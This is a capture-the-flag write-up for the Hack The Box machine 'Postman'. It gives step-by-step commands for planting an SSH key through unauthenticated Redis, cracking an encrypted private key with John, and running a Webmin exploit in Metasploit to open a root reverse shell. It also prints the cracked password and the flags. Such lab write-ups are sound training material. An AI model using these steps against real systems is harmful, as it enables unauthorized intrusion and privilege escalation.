# Postman
Box IP **10.10.10.160**


### Nmap scan

`msf > db_nmap -sC -sV -T4 postman.htb`


### Services
```
22/tcp      OpenSSH
80/tcp      Apache httpd 2.4.29 (Ubuntu)
6379/tcp    Redis key-value store 4.0.9
10000/tcp   MiniServ 1.910 (Webmin httpd)
```

Surfing to https://postman.htb a website shows up


### Fuzzing

Trying to fuzz for web directories, but nothing shows up
```
$ gobuster dir -u http://10.10.10.160 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.log
```

Surfing to https://postman.htb:10000 we find the webmin login page.


### Redis

Switching to port 6379, there is a Redis key store 4.0.9.

Trying Anonymous login we get useful information
```
$ redis-cli -h postman.htb
> info
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
> config get *
11) "logfile"
12) "/var/log/redis/redis-server.log"
165) "dir"
166) "/var/lib/redis/.ssh"
```

We are going to create a SSH key pair, upload the public key to the **authorized_keys** file and login via SSH using the **redis** user.


### Upload SSH key
```
$ ssh-keygen -t rsa
$ cat ./.ssh/id_rsa.pub > sshPub.txt
```
```
cat sshPub.txt | redis-cli -h postman.htb -x set crackit
```
```
$ redis-cli -h postman.htb
> config set dir /var/lib/redis/.ssh
> config set dbfilename "authorized_keys"
> save
> quit
```

### SSH login
```
$ ssh -i sshPrv.txt redis@postman.htb
```

Exploring the file system we find the user account **Matt**.


### Search for .bak files
```
$ find / -name "*.bak" -ls 2>&1 | grep -v "Permission denied"
```

We find **/opt/id_rsa.bak** file.

By catting the file we find an encrypted SSH RSA private key.


### Cracking

We decide to crack the key with John

```
$ locate ssh2john.py
$ python /usr/share/john/ssh2john.py prvKey > prvKey.hash
$ john -wordlist:/usr/share/wordlists/rockyou.txt prvKey.hash
```

Cracked password is **computer2008**.


### SSH login
```
$ ssh -i prvKey Matt@htb.postman
```

The login to Matt with the private key does not work!


### User Flag

By switching user we login as Matt and we get the user flag
```
$ cat /home/Matt/user.txt
517ad0ec2458ca97af8d93aac08a2f3c
```


### Privilege Escalation

Login to https://postman.htb:10000 with **Matt:computer2008** works.

By noticing that Webmin miniserv (**/etc/webmin/miniserv.conf**) runs with root permissions we can exploit a vulnerability of this version of [Webmin](https://www.exploit-db.com/exploits/46984)


### Webmin exploit
```
$ searchsploit webmin
$ mv 46984.rb /usr/shar/metasploit-framework/modules/exploits/
```
```
msf > reload-all
msf > search 46984
msf > use exploit/46984

> set rhost 10.10.10.160
> set lhost <tun0 IP>
> set lport 4444
> set password computer2008
> ser username Matt
> set ssl yes
> run
```

Then we have a **root** reverse TCP shell and we get the root flag

```
$ cat /root/root.txt
a257741c5bed8be7778c6ed95686ddce
```


If you liked this write-up, please leave a respect on my hackthebox

![htbbadge](https://www.hackthebox.eu/badge/image/77747)
